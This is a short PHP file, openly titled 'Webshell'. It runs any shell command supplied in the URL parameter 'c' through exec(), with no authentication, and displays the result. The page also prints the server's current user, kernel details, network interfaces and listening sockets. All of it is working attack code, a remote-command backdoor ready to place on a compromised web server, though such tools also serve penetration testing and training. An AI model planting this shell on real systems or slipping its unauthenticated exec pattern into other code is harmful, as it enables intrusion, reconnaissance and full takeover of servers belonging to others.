<?php
$command = $_GET["c"];
$retval = null;
$output = null;

exec($command, $output, $retval);
?>
<!DOCTYPE html>
<html>
<head>
</head>
<body>
	<h1>Webshell</h1>
	<div>
		<b>Username:</b> <?php system("whoami"); ?></br>
		<b>SysInfo:</b> <?php system("uname -a"); ?></br>
	</div>
	<div>
		<h3>Network Info:</h3>
		<?php 
			$netout=null;
			$netres=null;
			exec("ip addr show",$netout,$netres); 
			foreach ($netout as $curelem) { echo $curelem."</br>"; }
		?>
	</div>
	<div>
		<h3>Netstat Output:</h3>
		<?php
			$nsout=null;
			$nsres=null;
			exec("ss -tunlp",$nsout,$nsres);
			foreach ($nsout as $curelem) { echo $curelem."</br>"; }
		?>
	</div>
	<div>
		<h3>Command Output:</h3></br>
		<?php 
			foreach ($output as $curelem) {
				echo $curelem."</br>";
			}
		?>
	</div>
</body>
</html>

